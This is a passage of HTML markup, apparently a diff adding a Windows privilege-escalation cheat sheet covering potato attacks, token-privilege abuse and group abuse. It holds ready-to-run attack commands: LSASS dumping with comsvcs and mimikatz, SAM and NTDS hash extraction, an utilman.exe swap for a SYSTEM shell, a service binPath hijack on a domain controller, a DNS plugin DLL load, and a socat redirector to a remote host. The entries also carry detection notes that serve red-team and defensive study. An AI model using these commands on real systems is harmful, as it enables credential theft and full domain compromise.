+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/ohpe/juicy-potato" rel="noopener nofollow">JuicyPotato</a></li><li><a href="https://ohpe.it/juicy-potato/CLSID/" rel="noopener nofollow">CLSID lists</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">T1134.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://ohpe.it/juicy-potato/" rel="noopener nofollow">ohpe (Pierini &amp; Trotta), Juicy Potato (abusing the golden privileges)</a></li><li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" rel="noopener nofollow">jlajara, Potatoes</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A fake DCOM/OXID listener on a local port plus a burst of local NTLM is detectable, and the binary is widely signatured.</p>
+</article>
+<article id="pe-pot-printspoofer">
+<h3>PrintSpoofer</h3>
+<p class="summary">Coerce the Print Spooler over a named pipe for a SYSTEM token.</p>
+<p class="desc">itm4n's replacement for JuicyPotato on 1809 and later. Make the Print Spooler service connect to a named pipe you control, then impersonate the SYSTEM token that arrives. Entirely local with no network redirector, which makes it the simplest option when the Spooler is running.</p>
+<p class="meta"><b>Affects:</b> Windows 10/11 and Server 2016 to 2022 wherever the Print Spooler service runs. Fails when Spooler is disabled, which is common post-PrintNightmare hardening.</p>
+<h4>Requires</h4><ul class="req"><li>SeImpersonatePrivilege (PrintSpoofer checks/enables only this; a SeAssignPrimaryToken-only host needs a different primitive)</li><li>Print Spooler service running</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># SYSTEM shell via the Spooler pipe</span>
+PrintSpoofer.exe -i -c cmd.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/itm4n/PrintSpoofer" rel="noopener nofollow">PrintSpoofer</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">T1134.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" rel="noopener nofollow">itm4n, PrintSpoofer</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Named-pipe Spooler coercion and the binary are signatured; many hardened hosts disable the Spooler entirely.</p>
+</article>
+<article id="pe-pot-roguepotato">
+<h3>RoguePotato</h3>
+<p class="summary">Redirect the DCOM OXID resolver to a remote listener (post-1809).</p>
+<p class="desc">Revives the JuicyPotato approach on builds where the local OXID trick was patched. Point DCOM OXID resolution at a remote redirector on port 135, which forwards back to a local socket, capture the SYSTEM authentication, and impersonate it. The remote port-135 requirement is its main constraint.</p>
+<p class="meta"><b>Affects:</b> Windows 10 1809 and later, Server 2019 and later. Needs a machine you control reachable on port 135 to host the OXID redirector.</p>
+<h4>Requires</h4><ul class="req"><li>SeImpersonate or SeAssignPrimaryToken</li><li>A redirector reachable on port 135</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># On your redirector (forward 135 to the target)</span>
+socat tcp-listen:135,reuseaddr,fork tcp:&lt;target&gt;:9999</code></pre>
+<pre><code><span class="cmt"># On the target</span>
+RoguePotato.exe -r &lt;redirector_ip&gt; -e &quot;cmd.exe&quot; -l 9999</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/antonioCoco/RoguePotato" rel="noopener nofollow">RoguePotato</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">T1134.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/" rel="noopener nofollow">decoder.cloud, No more JuicyPotato? Old story, welcome RoguePotato!</a></li><li><a href="https://github.com/antonioCoco/RoguePotato" rel="noopener nofollow">RoguePotato (antonioCoco)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Outbound 135 to an external host is unusual on a workstation and stands out; the binary is signatured.</p>
+</article>
+<article id="pe-pot-godpotato">
+<h3>GodPotato</h3>
+<p class="summary">rpcss OXID flaw covering Windows 8 to 11 and Server 2012 to 2022.</p>
+<p class="desc">A DCOM-based coercion that abuses how the rpcss service handles OXID resolution, working across nearly every supported build with no network redirector and no Print Spooler dependency. Ship the .NET-version-matched binary (NET2 / NET35 / NET4) for the target.</p>
+<p class="meta"><b>Affects:</b> Windows 8 through 11 and Server 2012 through 2022, per the project. Local-only, with no redirector or Spooler dependency, which makes it the current default.</p>
+<h4>Requires</h4><ul class="req"><li>SeImpersonate or SeAssignPrimaryToken</li><li>A matching .NET runtime on the host</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># SYSTEM command (match .NET to the host)</span>
+GodPotato-NET4.exe -cmd &quot;cmd /c whoami&quot;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/BeichenDream/GodPotato" rel="noopener nofollow">GodPotato</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">T1134.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://github.com/BeichenDream/GodPotato" rel="noopener nofollow">GodPotato (BeichenDream)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> DCOM activation plus a local NTLM coercion; the binary is signatured, though the local-only footprint is quieter than RoguePotato.</p>
+</article>
+<article id="pe-sebackup-restore">
+<h3>SeBackup / SeRestore</h3>
+<p class="summary">Read protected files (SAM/SYSTEM, NTDS) bypassing ACLs.</p>
+<p class="desc">SeBackupPrivilege grants read access to any file regardless of its ACL; SeRestorePrivilege grants write. On a workstation/server, copy out the SAM and SYSTEM hives for offline hash extraction. On a Domain Controller, use diskshadow (VSS) + robocopy /b to exfiltrate ntds.dit, and also pull the SYSTEM hive (reg save HKLM\SYSTEM) because ntds.dit is encrypted with a key protected by the DC's boot key: without SYSTEM the hashes cannot be decrypted. Then parse both offline to dump every domain hash. This DC / ntds.dit path is MITRE T1003.003 (NTDS), distinct from the local SAM path (T1003.002).</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (privilege model).</p>
+<h4>Requires</h4><ul class="req"><li>SeBackupPrivilege (and SeRestorePrivilege for write paths; robocopy /b on the DC path needs both, so with only SeBackup use Copy-FileSeBackupPrivilege (giuliano108) instead)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Copy SAM + SYSTEM hives</span>
+reg save HKLM\SAM C:\Temp\sam.hive
+reg save HKLM\SYSTEM C:\Temp\system.hive</code></pre>
+<pre><code><span class="cmt"># Extract hashes offline</span>
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL</code></pre>
+<pre><code><span class="cmt"># DC path: parse ntds.dit with the SYSTEM hive</span>
+impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" rel="noopener nofollow">diskshadow</a></li><li><a href="https://github.com/fortra/impacket" rel="noopener nofollow">impacket-secretsdump</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1003/002/" rel="noopener nofollow">T1003.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html" rel="noopener nofollow">HackTricks, Abusing Tokens</a></li><li><a href="https://attack.mitre.org/techniques/T1003/003/" rel="noopener nofollow">MITRE T1003.003, NTDS (the DC / ntds.dit path)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> reg save / diskshadow scripts / VSS snapshot creation are detectable. The privilege may need explicit enabling in the token first.</p>
+</article>
+<article id="pe-sedebug-lsass">
+<h3>SeDebug</h3>
+<p class="summary">Open LSASS / steal a SYSTEM token.</p>
+<p class="desc">SeDebugPrivilege lets you open a handle to processes owned by other users, including LSASS. Dump LSASS memory (procdump, comsvcs MiniDump, or mimikatz) to extract live logon secrets (NTLM hashes, Kerberos tickets/keys, and any cleartext), or open a SYSTEM process and duplicate its token directly. Effectively SYSTEM-equivalent.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions; on modern builds LSASS may be PPL-protected or Credential Guard-enabled, needing an extra bypass.</p>
+<h4>Requires</h4><ul class="req"><li>SeDebugPrivilege (effectively admin/SYSTEM-equivalent)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># comsvcs MiniDump (LOLBAS)</span>
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;lsass_pid&gt; C:\Temp\lsass.dmp full</code></pre>
+<pre><code><span class="cmt"># Parse offline with mimikatz</span>
+sekurlsa::minidump C:\Temp\lsass.dmp
+sekurlsa::logonpasswords</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/gentilkiwi/mimikatz" rel="noopener nofollow">mimikatz</a></li><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump" rel="noopener nofollow">ProcDump (Sysinternals)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">T1134.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://lolbas-project.github.io/lolbas/Libraries/comsvcs/" rel="noopener nofollow">LOLBAS, comsvcs.dll</a></li><li><a href="https://attack.mitre.org/techniques/T1003/001/" rel="noopener nofollow">MITRE T1003.001, LSASS Memory (the dump path)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> LSASS handle opens (esp. by rundll32/procdump) are top-tier EDR detections.</p>
+</article>
+<article id="pe-setakeownership">
+<h3>SeTakeOwnership</h3>
+<p class="summary">Take ownership of a SYSTEM binary, then replace it.</p>
+<p class="desc">SeTakeOwnershipPrivilege lets you become the owner of any object. Take ownership of a binary that auto-runs as SYSTEM (classic: C:\Windows\System32\utilman.exe or sethc.exe), grant yourself write, and replace it. Trigger it from the logon screen (Ease of Access / Sticky Keys) to get a SYSTEM shell.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (privilege model).</p>
+<h4>Requires</h4><ul class="req"><li>SeTakeOwnershipPrivilege</li><li>Ability to reach the logon screen (for the utilman/sethc trigger)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Take ownership + grant write</span>
+takeown /f C:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant &quot;%USERNAME%&quot;:F</code></pre>
+<pre><code><span class="cmt"># Replace with cmd, trigger at lock screen</span>
+copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown" rel="noopener nofollow">takeown (built-in)</a></li><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls" rel="noopener nofollow">icacls (built-in)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1546/008/" rel="noopener nofollow">T1546.008</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html" rel="noopener nofollow">HackTricks, Abusing Tokens</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Replacing utilman.exe / sethc.exe is a well-known IOC. Back up and restore the original to avoid breaking accessibility.</p>
+</article>
+<article id="pe-seloaddriver">
+<h3>SeLoadDriver</h3>
+<p class="summary">Load a vulnerable signed driver, exploit it for kernel code exec.</p>
+<p class="desc">SeLoadDriverPrivilege allows loading kernel-mode drivers. Use EoPLoadDriver to enable the privilege and register a service key under HKCU, then NtLoadDriver a known-vulnerable signed driver (e.g. Capcom.sys) and exploit its arbitrary-kernel-exec to elevate to SYSTEM (a bring-your-own-vulnerable-driver, or BYOVD, pattern).</p>
+<p class="meta"><b>Affects:</b> All versions if held. The Microsoft driver-blocklist is default-on only from Windows 11 22H2; elsewhere (stock Windows 10, Server 2022) it depends on HVCI/memory-integrity being enabled, and without it blocklisted drivers like Capcom.sys still load. Where active, HVCI and the blocklist block most vulnerable drivers.</p>
+<h4>Requires</h4><ul class="req"><li>SeLoadDriverPrivilege (held by e.g. Print Operators)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Register + load the driver</span>
+EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys</code></pre>
+<pre><code><span class="cmt"># Exploit the loaded driver for kernel exec -&gt; SYSTEM</span>
+ExploitCapcom.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/TarlogicSecurity/EoPLoadDriver" rel="noopener nofollow">EoPLoadDriver</a></li><li><a href="https://github.com/tandasat/ExploitCapcom" rel="noopener nofollow">ExploitCapcom</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" rel="noopener nofollow">Tarlogic, Abusing SeLoadDriverPrivilege for privilege escalation</a></li><li><a href="https://github.com/TarlogicSecurity/EoPLoadDriver" rel="noopener nofollow">Tarlogic, EoPLoadDriver (SeLoadDriverPrivilege abuse)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Loading a known-vulnerable driver is heavily flagged; modern Windows + HVCI / driver blocklist may refuse the load.</p>
+</article>
+<article id="pe-semanagevolume">
+<h3>SeManageVolume</h3>
+<p class="summary">Abuse volume privilege to gain write on C:\, then DLL hijack.</p>
+<p class="desc">SeManageVolumePrivilege can be abused (via the public SeManageVolumeExploit) to obtain full write access over the C:\ drive, including C:\Windows\System32. With that, plant a malicious DLL that a SYSTEM process loads (e.g. tzres.dll triggered by systeminfo, or PrintConfig.dll via PrintNotify) to execute as SYSTEM.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (privilege model).</p>
+<h4>Requires</h4><ul class="req"><li>SeManageVolumePrivilege</li><li>A SYSTEM process that loads a writable/missing DLL to trigger</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Grant write over C:\ (then DLL hijack)</span>
+SeManageVolumeExploit.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/CsEnox/SeManageVolumeExploit" rel="noopener nofollow">SeManageVolumeExploit</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/001/" rel="noopener nofollow">T1574.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c" rel="noopener nofollow">gtworek, PSBits FSCTL_SD_GLOBAL_CHANGE PoC</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Writing a DLL into System32 and forcing a SYSTEM load is detectable (image-load + file-create in System32). The exploit re-ACLs C:\ to grant the Users group (every local user) full control, a persistent, drive-wide DACL change that is a durable IOC and a security downgrade left behind; revert it afterward.</p>
+</article>
+<article id="pe-setrustedcredman">
+<h3>SeTrustedCredManAccess</h3>
+<p class="summary">Back up and decrypt every Credential Manager secret.</p>
+<p class="desc">SeTrustedCredManAccessPrivilege (&quot;Access Credential Manager as a trusted caller&quot;) is held by Winlogon and LSASS by default. With it, enable the privilege, impersonate the Winlogon token, call CredBackupCredentials to export the user's Credential Manager store, then decrypt it with CryptUnprotectData, recovering saved passwords for escalation or lateral movement.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions if the privilege is held (Winlogon and LSASS by default; rarely delegated).</p>
+<h4>Requires</h4><ul class="req"><li>SeTrustedCredManAccessPrivilege in the token</li><li>An elevated/local-admin context to borrow Winlogon's token (no unprivileged user holds this privilege directly)</li></ul>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/Barbarisch/forkatz" rel="noopener nofollow">forkatz</a></li><li><a href="https://github.com/leftp/BackupCreds" rel="noopener nofollow">BackupCreds</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1555/004/" rel="noopener nofollow">T1555.004</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html" rel="noopener nofollow">Tyranid's Lair, Dumping Stored Credentials</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Rarely granted outside Winlogon; CredBackupCredentials while impersonating Winlogon is an unusual, detectable call sequence.</p>
+</article>
+<article id="pe-secreatetoken">
+<h3>SeCreateToken</h3>
+<p class="summary">Call NtCreateToken to forge a token with a privileged group SID.</p>
+<p class="desc">SeCreateTokenPrivilege lets you build a token by hand with NtCreateToken. You cannot simply mint a usable NT AUTHORITY\SYSTEM token from nothing (naive attempts fail), but you can forge an impersonation token for your own user with a high-privilege group SID added, typically the local Administrators SID, subject to the rule that the forged token's integrity is at or below your process. Impersonate that token to act as a local administrator, then take any Admin to SYSTEM path. Rarely granted, but a direct win where it is.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions when the privilege is held (very rarely granted to a non-SYSTEM account).</p>
+<h4>Requires</h4><ul class="req"><li>SeCreateTokenPrivilege in the token</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm the privilege</span>
+whoami /priv</code></pre>
+<pre><code><span class="cmt"># Forge an Administrators token, then impersonate it</span>
+:: build and run the SeCreateTokenPrivilegePoC from daem0nc0re/PrivFu</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/daem0nc0re/PrivFu" rel="noopener nofollow">daem0nc0re / PrivFu (token-privilege PoCs)</a></li><li><a href="https://github.com/gtworek/Priv2Admin" rel="noopener nofollow">Priv2Admin</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/003/" rel="noopener nofollow">T1134.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://www.exploit-db.com/papers/42556" rel="noopener nofollow">Abusing Token Privileges for LPE (ExploitDB 42556)</a></li><li><a href="https://github.com/gtworek/Priv2Admin" rel="noopener nofollow">Priv2Admin, SeCreateTokenPrivilege</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A process other than LSASS calling NtCreateToken, then impersonating a token carrying an added Administrators SID, is anomalous and detectable.</p>
+</article>
+<article id="pe-setcb">
+<h3>SeTcb</h3>
+<p class="summary">Act as part of the OS to craft a privileged token.</p>
+<p class="desc">SeTcbPrivilege lets a process act as part of the trusted computing base. Combined with the LSA logon APIs (LsaLogonUser), it can add arbitrary high-privilege SIDs to a token or obtain a SYSTEM-level token, escalating to full control.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions if the privilege is held (very rarely granted).</p>
+<h4>Requires</h4><ul class="req"><li>SeTcbPrivilege in the token</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># No off-the-shelf one-liner: requires custom code calling LsaLogonUser to make and impersonate a token</span>
+:: build and run a SeTcb LsaLogonUser PoC (gtworek PsBits)</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/gtworek/PSBits" rel="noopener nofollow">gtworek PsBits (VirtualAccounts / TcbElevation)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/003/" rel="noopener nofollow">T1134.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://github.com/gtworek/Priv2Admin" rel="noopener nofollow">Priv2Admin, Windows privilege abuse</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Rarely granted; abnormal LSA logon calls are detectable.</p>
+</article>
+<article id="pe-serelabel">
+<h3>SeRelabel</h3>
+<p class="summary">Own a higher-integrity (SYSTEM) object → SYSTEM.</p>
+<p class="desc">SeRelabelPrivilege can modify an object's mandatory integrity label, letting you take ownership of objects at a HIGHER integrity level than your own, including SYSTEM processes. From a High-integrity context, take ownership of a SYSTEM process, grant yourself full control over it, and inject/parent-spoof into it to execute as NT AUTHORITY\SYSTEM. Stronger than SeTakeOwnership, but needs High integrity and is almost never granted to users.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions if held (almost never granted); needs a High-integrity context.</p>
+<h4>Requires</h4><ul class="req"><li>SeRelabelPrivilege</li><li>High-integrity context</li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/" rel="noopener nofollow">T1134</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/" rel="noopener nofollow">Decoder, Abusing the SeRelabelPrivilege</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A serious misconfiguration if a standard user holds it; taking ownership of a SYSTEM process is a strong detection.</p>
+</article>
+<article id="pe-backup-operators">
+<h3>Backup Operators</h3>
+<p class="summary">Group grants SeBackup/SeRestore for reading SAM/NTDS.</p>
+<p class="desc">Members of the Backup Operators group are granted SeBackupPrivilege and SeRestorePrivilege. Enable them in your token, then read the protected SAM/SYSTEM hives locally and dump the local hashes offline, converging on the same SeBackup/SeRestore tradecraft (the ntds.dit-on-a-DC path is covered under SeBackup/SeRestore).</p>
+<p class="meta"><b>Affects:</b> All supported Windows / Server versions.</p>
+<h4>Requires</h4><ul class="req"><li>Membership in Backup Operators</li><li>Privilege present in the token but may need explicit enabling; on interactive logon with UAC/AAM the token can be filtered, so obtain a non-filtered token (e.g. WinRM) or run in an elevated context</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm group membership</span>
+whoami /groups | findstr /i &quot;Backup&quot;</code></pre>
+<pre><code><span class="cmt"># Save hives (SeBackup)</span>
+reg save HKLM\SAM C:\Temp\sam.hive &amp; reg save HKLM\SYSTEM C:\Temp\system.hive</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/fortra/impacket" rel="noopener nofollow">impacket-secretsdump</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1003/002/" rel="noopener nofollow">T1003.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://github.com/mpgn/BackupOperatorToDA" rel="noopener nofollow">mpgn, BackupOperatorToDA</a></li><li><a href="https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/" rel="noopener nofollow">PentestLab, Backup Operator</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The privileges are not enabled by default in a non-elevated token. Same detection profile as SeBackup/SeRestore.</p>
+</article>
+<article id="pe-server-operators">
+<h3>Server Operators</h3>
+<p class="summary">Reconfigure a DC service binPath to run as SYSTEM.</p>
+<p class="desc">On Domain Controllers, the Server Operators group can manage services. Reconfigure a SYSTEM service binPath to your command and restart it to execute as SYSTEM on the DC, directly compromising the domain.</p>
+<p class="meta"><b>Affects:</b> All supported Windows Server versions (Domain Controllers).</p>
+<h4>Requires</h4><ul class="req"><li>Membership in Server Operators (on a DC)</li><li>Ability to start/stop a target service</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Hijack a service binPath (on a DC this grants BUILTIN\Administrators = domain-admin-equivalent)</span>
+sc config &lt;svc&gt; binpath= &quot;cmd /c net localgroup administrators &lt;YOUR-DOMAIN-USER&gt; /add&quot;</code></pre>
+<pre><code><span class="cmt"># Trigger (net.exe is not a service binary, so the start returns error 1053; the command already ran as SYSTEM, this is expected)</span>
+sc stop &lt;svc&gt; &amp; sc start &lt;svc&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config" rel="noopener nofollow">sc (built-in)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener nofollow">T1543.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/" rel="noopener nofollow">HackingArticles, Server Operator Group</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> sc config + service restart on a DC is high-signal. Restore the original binPath afterward.</p>
+</article>
+<article id="pe-dnsadmins">
+<h3>DnsAdmins</h3>
+<p class="summary">Load a DnsPlugin DLL into the SYSTEM DNS service.</p>
+<p class="desc">Members of DnsAdmins can set the ServerLevelPluginDll value via dnscmd, pointing the DNS service at a plugin DLL with no path validation. Restarting the DNS service (often on a DC, running as SYSTEM) loads your DLL as SYSTEM. The DLL must be a real DNS plugin: it has to export DnsPluginInitialize / DnsPluginQuery / DnsPluginCleanup (returning 0) and run the payload in a new thread, or dns.exe fails to start and the session dies. A plain msfvenom DLL lacks these exports; use mimilib.dll or a custom DnsPlugin DLL. Highly disruptive: the DNS service may crash.</p>
+<p class="meta"><b>Affects:</b> All supported Windows Server versions running the DNS role.</p>
+<h4>Requires</h4><ul class="req"><li>Membership in DnsAdmins</li><li>Permission to restart the DNS service</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Point DNS at a DnsPlugin DLL</span>
+dnscmd.exe /config /serverlevelplugindll C:\Temp\mimilib.dll</code></pre>
+<pre><code><span class="cmt"># Restart DNS to load it (DnsAdmins-native trigger)</span>
+dnscmd &lt;server&gt; /restart</code></pre>
+<pre><code><span class="cmt"># sc.exe restart (only if you hold service-control / local-admin rights)</span>
+sc.exe stop dns &amp;&amp; sc.exe start dns</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" rel="noopener nofollow">dnscmd (built-in)</a></li><li><a href="https://github.com/gentilkiwi/mimikatz" rel="noopener nofollow">mimilib.dll (mimikatz)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener nofollow">T1543.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83" rel="noopener nofollow">Shay Ber, Feature not bug: DNSAdmin to DC compromise in one line</a></li><li><a href="https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" rel="noopener nofollow">labofapenetrationtester, Abusing DNSAdmins</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> ServerLevelPluginDll write under DNS\Parameters and DNS.exe spawning a child are strong detections. Disruptive to AD DNS.</p>
+</article>
+<article id="pe-hyperv-admins">
+<h3>Hyper-V Administrators</h3>
+<p class="summary">Redirect vmms.exe (SYSTEM) file ops via a hardlink to escalate.</p>
+<p class="desc">Hyper-V Administrators can make vmms.exe, which runs as SYSTEM, perform file operations on paths they otherwise cannot touch. During VM deletion vmms.exe resets the .vhdx permissions with an unimpersonated SetSecurity as SYSTEM; a hardlink redirects that permission-reset so you are granted a full-control DACL over an existing protected file. From there, chain a file-write-to-SYSTEM technique to execute. A hardlink/TOCTOU file-operation abuse of the service, not one specific CVE.</p>
+<p class="meta"><b>Affects:</b> Hosts where Hyper-V Administrators can drive vmms.exe storage operations. The vmms DACL-grant primitive is a by-design won't-fix (Microsoft ruled the group is not a security boundary), so it works wherever the group exists; what is version-gated is the follow-on file-write-to-SYSTEM chain, which later builds mitigate.</p>
+<h4>Requires</h4><ul class="req"><li>Membership in Hyper-V Administrators</li><li>A file-write-to-SYSTEM chain (e.g. CVE-2018-0952 / CVE-2019-0841 / DiagHub) available on the target build</li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/" rel="noopener nofollow">decoder.cloud, From Hyper-V Admin to SYSTEM</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The vmms DACL grant is by-design and works everywhere the group exists; you still rely on winning a file-operation race against vmms.exe and on a write-to-SYSTEM step that later builds mitigate.</p>
+</article>
+<article id="pe-print-operators">
+<h3>Print Operators</h3>
+<p class="summary">Group holds SeLoadDriverPrivilege; load vulnerable driver.</p>
+<p class="desc">On a domain controller, the Print Operators group is granted SeLoadDriverPrivilege by default (to install printer drivers); this is not a workstation/member-server default, where &quot;Load and unload device drivers&quot; is assigned to Administrators only and BUILTIN\Print Operators is a DC-scoped, effectively-empty group. Where held, it is the precondition for the SeLoadDriver → BYOVD path: load a known-vulnerable signed driver and exploit it for kernel-mode code execution as SYSTEM.</p>
+<p class="meta"><b>Affects:</b> Group right is version-independent, but since Windows 10 1803 NtLoadDriver forbids driver-config registry references under HKEY_CURRENT_USER (exactly what the vanilla EoPLoadDriver flow creates), so the plain technique fails by default on 1803+ and needs a bypass. On modern builds the follow-on driver load is further limited by HVCI / driver blocklist, and drivers other than the deny-listed Capcom.sys are required.</p>
+<h4>Requires</h4><ul class="req"><li>Membership in Print Operators (grants SeLoadDriverPrivilege)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Confirm group + privilege</span>
+whoami /groups | findstr /i Print
+whoami /priv | findstr /i SeLoadDriver</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/TarlogicSecurity/EoPLoadDriver" rel="noopener nofollow">EoPLoadDriver</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
